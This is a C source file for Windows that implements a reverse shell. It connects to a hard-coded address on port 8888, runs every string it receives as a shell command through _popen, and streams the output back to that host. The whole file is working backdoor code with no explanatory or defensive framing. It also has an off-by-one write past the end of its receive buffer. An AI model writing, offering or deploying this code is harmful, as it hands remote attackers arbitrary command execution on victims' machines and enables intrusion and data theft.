#include <stdio.h>
#include <winsock2.h>

void sendChunkedData(SOCKET s, const char *data, int length);

int main() {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        fprintf(stderr, "Error creating socket\n");
        return 1;
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr("192.168.123.7");
    serverAddr.sin_port = htons(8888);

    if (connect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        fprintf(stderr, "Error connecting to server\n");
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    } else {
        send(clientSocket, "run", 4, 0);
    }

    char buffer[10240];
    int bytesReceived;
    while (1) {
        bytesReceived = recv(clientSocket, buffer, 10240, 0);
        if (bytesReceived > 0) {
            buffer[bytesReceived] = '\0';
            FILE *fp = _popen(buffer, "r");
            if (fp == NULL) {
                fprintf(stderr, "Error executing command\n");
                continue;
            }
            char outputBuffer[4096];
            size_t bytesRead;
            while ((bytesRead = fread(outputBuffer, 1, sizeof(outputBuffer), fp)) > 0) {
                sendChunkedData(clientSocket, outputBuffer, bytesRead);
            }
            _pclose(fp);
        } else if (bytesReceived == 0) {
            printf("Server disconnected\n");
            break;
        } else {
            fprintf(stderr, "Error receiving data\n");
            break;
        }
    }

    closesocket(clientSocket);
    WSACleanup();
    return 0;
}

void sendChunkedData(SOCKET s, const char *data, int length) {
    int totalSent = 0;
    int bytesLeft = length;
    int bytesSent;
    while (totalSent < length) {
        bytesSent = send(s, data + totalSent, bytesLeft, 0);
        if (bytesSent == SOCKET_ERROR) {
            fprintf(stderr, "Error sending data\n");
            break;
        }
        totalSent += bytesSent;
        bytesLeft -= bytesSent;
    }
    send(s, "\n", 1, 0);
}